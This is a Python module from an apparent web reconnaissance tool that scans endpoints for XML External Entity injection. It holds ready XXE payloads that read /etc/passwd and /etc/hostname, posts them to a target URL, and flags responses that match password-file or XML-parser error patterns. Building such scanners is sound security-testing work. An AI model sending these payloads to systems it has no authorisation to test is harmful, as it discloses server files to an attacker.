"""P2 — XML External Entity (XXE) injection detector."""

from __future__ import annotations

import re
from typing import Any, List

from godrecon.modules.base import Finding
from godrecon.utils.logger import get_logger

logger = get_logger(__name__)

_XXE_PAYLOADS = [
    '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
    '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/hostname">]><foo>&xxe;</foo>',
    '<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
]

_XXE_INDICATORS = [
    r"root:x:0:0",
    r"bin:x:",
    r"xml.*processing",
    r"<!DOCTYPE",
    r"SYSTEM",
]

_XML_ERROR_PATTERNS = [
    r"XML parsing error",
    r"XMLSyntaxError",
    r"SAXParseException",
    r"javax\.xml",
    r"org\.xml\.sax",
    r"DOMException",
]


class XXEDetector:
    """Detects XML External Entity injection vulnerabilities."""

    def __init__(
        self,
        http_client: Any,
        safe_mode: bool = True,
        max_payloads: int = 10,
    ) -> None:
        self.http = http_client
        self.safe_mode = safe_mode
        self.max_payloads = max_payloads

    async def scan(self, url: str, params: List[str]) -> List[Finding]:
        """Scan URL parameters for XXE by sending XML payloads via POST."""
        findings: List[Finding] = []

        for payload in _XXE_PAYLOADS[: self.max_payloads]:
            try:
                headers = {"Content-Type": "application/xml"}
                resp = await self.http.post(url, data=payload, headers=headers)
                if not resp:
                    continue
                body = resp.get("body", "") or ""

                # Check for file content disclosure
                for pattern in _XXE_INDICATORS[:2]:
                    if re.search(pattern, body):
                        findings.append(Finding(
                            title=f"XXE Injection (File Disclosure) — {url}",
                            description=(
                                f"Endpoint may be vulnerable to XXE. "
                                f"File content pattern detected in response."
                            ),
                            severity="high",
                            confidence=0.9,
                            data={"url": url, "payload": payload, "method": "POST"},
                            tags=["xxe", "p2", "high"],
                            evidence=f"Pattern '{pattern}' matched in response to XXE payload",
                        ))
                        break

                # Check for XML processing errors that indicate XML is parsed
                for pattern in _XML_ERROR_PATTERNS:
                    if re.search(pattern, body, re.I):
                        findings.append(Finding(
                            title=f"XXE Injection (XML Processing Detected) — {url}",
                            description=(
                                f"Endpoint processes XML input — may be vulnerable to XXE. "
                                f"XML error indicator found in response."
                            ),
                            severity="high",
                            confidence=0.6,
                            data={"url": url, "payload": payload, "method": "POST"},
                            tags=["xxe", "p2", "high"],
                            evidence=f"XML error pattern '{pattern}' found in response",
                        ))
                        break
            except Exception as exc:
                logger.debug("XXE scan error: %s", exc)

        return findings
